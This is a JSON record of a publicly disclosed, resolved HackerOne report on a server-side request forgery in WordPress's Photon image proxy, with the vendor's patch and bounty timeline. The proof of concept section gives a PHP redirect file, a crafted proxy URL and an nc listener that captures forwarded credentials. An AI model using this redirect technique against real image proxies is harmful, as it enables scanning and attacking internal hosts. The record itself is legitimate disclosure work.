@@ -1,0 +1,327 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2017-06-17T23:50:07.613Z", 
+    "voters": [
+        "bl4de", 
+        "bogdantcaciuc", 
+        "skansing", 
+        "ak1", 
+        "eveeez", 
+        "madrobot", 
+        "axolotl", 
+        "khalifah", 
+        "japz", 
+        "zerotoone", 
+        "and 6 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "350.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 204513, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": null, 
+    "vulnerability_information": "Description\n------------------------\nThe service Photon located at `http://i0.wp.com/` and described at `https://code.trac.wordpress.org/browser/photon/` is vulnerable to Http SSRF via. redirect.\n\nThe redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.\n\nThe service does try to protect itself against this type of attack by using\n```\n// https://code.trac.wordpress.org/browser/photon/index.php#L111\ncurl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );\n```\nBut this does not guard against internal IP's, auth redirects nor other port attacks via http/https.\n\nDue to the different responses an attacker can use the service to scan and attack IP ranges for http services, do malicious actions and etc. \n\nPOC\n-----------------------------------\n**First a demo that the service does not allow firing requests to any port.**\n\n*Note you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param*\n\n- Goto `http://i0.wp.com/159.203.190.123:666/new.php?resize=0,1`\n- The responds `Sorry, the parameters you provided were not valid`\n\nThis protection happens because of the filter validation\n\n```\n// https://code.trac.wordpress.org/browser/photon/index.php#L142\nif ( isset( $_GET['q'] ) ) {\n        if ( $origin_domain_exception & PHOTON__ALLOW_QUERY_STRINGS ) {\n                $url .= '?' . preg_replace( '/#.*$/', '', (string) $_GET['q'] );\n                unset( $_GET['q'] );\n        } else {\n                httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );\n        }\n}\n\t\nif ( false === filter_var( $url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED ) )\n        httpdie( '400 Bad Request', 'Sorry, the parameters you provided were not valid' );\n```\n\n\n**Now a demo of bypassing the port restriction and appending authorization headers.**\n- Goto `http://i0.wp.com/159.203.190.123/new.php?resize=0,2`\n- The server gets a incoming request and responds with a 302\n`192.0.102.120 - - [08/Feb/2017:04:15:44 -0500] \"GET /new.php HTTP/1.1\" 302 199 \"-\" \"Photon/1.0\"`\n- Photon blindly follow the redirect, here is the output of a netcat listening in with the following command. `nc -l -p 666` and the Photon coming in\n\n```\nGET / HTTP/1.1\nHost: 159.203.190.123:666\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Photon/1.0\nAccept: */*\n```\nThe contents of `new.php` \n```\n<?php\nheader('Location: http://admin:admin@159.203.190.123:666');\n```\n\n\nPossible Fixes\n-----------------------\nThe side effects of the SSRF is => redirect to any IP, to any port, auth headers.\n\nI have seached for a way to configure these things in cURL but without success.\nI would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria.\n\nAlso consider using `curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );` atm. the link is vuln to MITM attack as the certs are not verified.  \n\n ", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "medium", 
+        "author_type": "User"
+    }, 
+    "title": "Infrastructure - Photon - SSRF", 
+    "is_member_of_team?": null, 
+    "vote_count": 16, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2017-07-17T23:50:07.695Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$350", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-16T17:44:00.569Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-16T17:44:00.569Z", 
+            "actor": {
+                "username": "vortfu", 
+                "url": "/vortfu", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Thanks for the report.\n\nI'm currently working on a patch for these issues and will send it over for review / testing shortly, there's just a few things I need to check on first (we're not explicitly blocking specifying port numbers or auth credentials for example, that's a side effect of `parse_url( $_SERVER['REQUEST_URI'] );` returning false under certain circumstances)", 
+            "markdown_message": "<p>Thanks for the report.</p>\n\n<p>I&#39;m currently working on a patch for these issues and will send it over for review / testing shortly, there&#39;s just a few things I need to check on first (we&#39;re not explicitly blocking specifying port numbers or auth credentials for example, that&#39;s a side effect of <code>parse_url( $_SERVER[&#39;REQUEST_URI&#39;] );</code> returning false under certain circumstances)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1489634, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-16T18:18:35.128Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-16T18:18:35.128Z", 
+            "actor": {
+                "username": "skansing", 
+                "url": "/skansing", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "Hey @vortfu ,\n\nNice, thanks for the update on the report.\n\nLooking forward to reading the fix =) \n\nAny chance we could triage the report?", 
+            "markdown_message": "<p>Hey <a href=\"/vortfu\">@vortfu</a> ,</p>\n\n<p>Nice, thanks for the update on the report.</p>\n\n<p>Looking forward to reading the fix =) </p>\n\n<p>Any chance we could triage the report?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1489727, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-23T21:29:51.519Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-23T21:29:51.519Z", 
+            "actor": {
+                "username": "vortfu", 
+                "url": "/vortfu", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "We've released a patch which should fix this.\n\nIf you could please verify that https://code.trac.wordpress.org/changeset/439/photon/index.php correctly addresses the issues mentioned in your report, we can go ahead and `Resolve` the issue.", 
+            "markdown_message": "<p>We&#39;ve released a patch which should fix this.</p>\n\n<p>If you could please verify that <a title=\"https://code.trac.wordpress.org/changeset/439/photon/index.php\" href=\"/redirect?signature=3c7d982180c8c07066207bd2a99fe629b6618717&amp;url=https%3A%2F%2Fcode.trac.wordpress.org%2Fchangeset%2F439%2Fphoton%2Findex.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://code.trac.wordpress.org/changeset/439/photon/index.php</span><i class=\"icon-external-link\"></i></a> correctly addresses the issues mentioned in your report, we can go ahead and <code>Resolve</code> the issue.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 1502208, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-02-23T22:05:49.956Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-02-23T22:05:49.956Z", 
+            "actor": {
+                "username": "skansing", 
+                "url": "/skansing", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "I tried to reproduce any of the issues mentioned in the report (SSRF, AUTH) and have not been able to.\n\nNice fix.", 
+            "markdown_message": "<p>I tried to reproduce any of the issues mentioned in the report (SSRF, AUTH) and have not been able to.</p>\n\n<p>Nice fix.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 1502290, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "skansing", 
+                "url": "/skansing"
+            }, 
+            "created_at": "2017-03-02T02:47:59.064Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-02T02:47:59.064Z", 
+            "actor": {
+                "username": "vortfu", 
+                "url": "/vortfu", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/004/982/b80411c54ee08b9579811d3427a54368f8d03d09_medium.png?1422255349"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BugResolved", 
+            "id": 1514741, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2017-03-02T02:51:01.735Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-03-02T02:51:01.735Z", 
+            "actor": {
+                "url": "/wordpress", 
+                "profile": {
+                    "name": "WordPress"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+                }
+            }, 
+            "team_handle": "wordpress", 
+            "bonus_amount": "0.0", 
+            "bounty_amount": "350.0", 
+            "collaborator": {
+                "username": "skansing", 
+                "url": "/skansing"
+            }, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::BountyAwarded", 
+            "id": 1514742, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-06-17T23:50:07.650Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-06-17T23:50:07.650Z", 
+            "actor": {
+                "username": "skansing", 
+                "url": "/skansing", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/039/510/35216d41cc708c8a9081fb1d4ea38579153e0864_medium.jpg?1460620858"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "wordpress", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 1763589, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2017-07-17T23:50:14.927Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2017-07-17T23:50:14.927Z", 
+            "actor": {
+                "url": "/wordpress", 
+                "profile": {
+                    "name": "WordPress"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+                }
+            }, 
+            "team_handle": "wordpress", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 1844906, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "skansing", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/skansing", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/039/510/91bea0e997720e8fa5454c81c61c2da28fe638e3_small.jpg?1460620858"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 68, 
+        "name": "Server-Side Request Forgery (SSRF)"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -43800326.933027275, 
+    "disclosed_at": "2017-07-17T23:50:14.884Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/204513", 
+    "created_at": "2017-02-08T10:06:44.378Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<h2 id=\"description\">Description</h2>\n\n<p>The service Photon located at <code>http://i0.wp.com/</code> and described at <code>https://code.trac.wordpress.org/browser/photon/</code> is vulnerable to Http SSRF via. redirect.</p>\n\n<p>The redirect can go to any IP (including inside of any firewall photon might be inside) any port and can add auth headers.</p>\n\n<p>The service does try to protect itself against this type of attack by using</p>\n<pre class=\"highlight plaintext\"><code>// https://code.trac.wordpress.org/browser/photon/index.php#L111\ncurl_setopt( $ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS );\n</code></pre>\n<p>But this does not guard against internal IP&#39;s, auth redirects nor other port attacks via http/https.</p>\n\n<p>Due to the different responses an attacker can use the service to scan and attack IP ranges for http services, do malicious actions and etc. </p>\n\n<h2 id=\"poc\">POC</h2>\n\n<p><strong>First a demo that the service does not allow firing requests to any port.</strong></p>\n\n<p><em>Note you can bust the cache by changing the params given to Photon, so if no response is given, just bump n+1 on resize param or add a new param</em></p>\n\n<ul>\n<li>Goto <code>http://i0.wp.com/159.203.190.123:666/new.php?resize=0,1</code>\n</li>\n<li>The responds <code>Sorry, the parameters you provided were not valid</code>\n</li>\n</ul>\n\n<p>This protection happens because of the filter validation</p>\n<pre class=\"highlight plaintext\"><code>// https://code.trac.wordpress.org/browser/photon/index.php#L142\nif ( isset( $_GET[&#39;q&#39;] ) ) {\n        if ( $origin_domain_exception &amp; PHOTON__ALLOW_QUERY_STRINGS ) {\n                $url .= &#39;?&#39; . preg_replace( &#39;/#.*$/&#39;, &#39;&#39;, (string) $_GET[&#39;q&#39;] );\n                unset( $_GET[&#39;q&#39;] );\n        } else {\n                httpdie( &#39;400 Bad Request&#39;, &#39;Sorry, the parameters you provided were not valid&#39; );\n        }\n}\n\nif ( false === filter_var( $url, FILTER_VALIDATE_URL, FILTER_FLAG_PATH_REQUIRED ) )\n        httpdie( &#39;400 Bad Request&#39;, &#39;Sorry, the parameters you provided were not valid&#39; );\n</code></pre>\n<p><strong>Now a demo of bypassing the port restriction and appending authorization headers.</strong></p>\n\n<ul>\n<li>Goto <code>http://i0.wp.com/159.203.190.123/new.php?resize=0,2</code>\n</li>\n<li>The server gets a incoming request and responds with a 302\n<code>192.0.102.120 - - [08/Feb/2017:04:15:44 -0500] &quot;GET /new.php HTTP/1.1&quot; 302 199 &quot;-&quot; &quot;Photon/1.0&quot;</code>\n</li>\n<li>Photon blindly follow the redirect, here is the output of a netcat listening in with the following command. <code>nc -l -p 666</code> and the Photon coming in</li>\n</ul>\n<pre class=\"highlight plaintext\"><code>GET / HTTP/1.1\nHost: 159.203.190.123:666\nAuthorization: Basic YWRtaW46YWRtaW4=\nUser-Agent: Photon/1.0\nAccept: */*\n</code></pre>\n<p>The contents of <code>new.php</code> </p>\n<pre class=\"highlight plaintext\"><code>&lt;?php\nheader(&#39;Location: http://admin:admin@159.203.190.123:666&#39;);\n</code></pre>\n<h2 id=\"possible-fixes\">Possible Fixes</h2>\n\n<p>The side effects of the SSRF is =&gt; redirect to any IP, to any port, auth headers.</p>\n\n<p>I have seached for a way to configure these things in cURL but without success.<br>\nI would recommend doing 1 request at a time, manually parsing the response and initiating a new request if the validates for such criteria.</p>\n\n<p>Also consider using <code>curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, TRUE );</code> atm. the link is vuln to MITM attack as the certs are not verified.  </p>\n", 
+    "severity_rating": "medium", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://wordpress.org/", 
+            "about": "Beautiful sites of any kind.", 
+            "twitter_handle": "wordpress", 
+            "name": "WordPress"
+        }, 
+        "handle": "wordpress", 
+        "url": "https://hackerone.com/wordpress", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/055/2ded484d947025dc191342c9ccdcf00effc53ff6_small.jpg?1392934661", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/055/a7e722c23dedc020ade3b6e7f1a96baa455f86d8_medium.jpg?1392934661"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 55, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
